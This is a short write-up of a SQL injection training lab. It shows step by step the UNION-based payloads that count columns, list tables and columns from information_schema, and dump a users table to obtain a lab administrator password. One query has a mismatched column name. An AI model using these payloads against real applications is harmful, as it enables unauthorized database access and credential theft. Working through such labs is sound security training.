# Lab-05 Sql Injection

## SQL injection attack, listing the database contents on non-Oracle databases

### Problem

- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

### Solution

- Goto => product category filter, Then use `'Order by 2--+` Find the column.

- After that Use Union attack `UNION SELECT NULL,NULL--+`

- To list all table_name in a database `'union select table_name,null from information_schema.tables--+`

- To list all column_name in a `users_ovdtmm` table use `'union select column_name,null from information_schema.columns where table_name ='users_ovdtmm'` 

- We see there are 2 column is there `username_fhwdom & password_pxccym`

- Then we try this query `'union select users_fhwdom,password_pxccym from users_ovdtmm--+` to gain administrator's password.

- we see the name as  `administrator & i6x1xla3hsb0t9p9hcul`

- Lab Solved!!
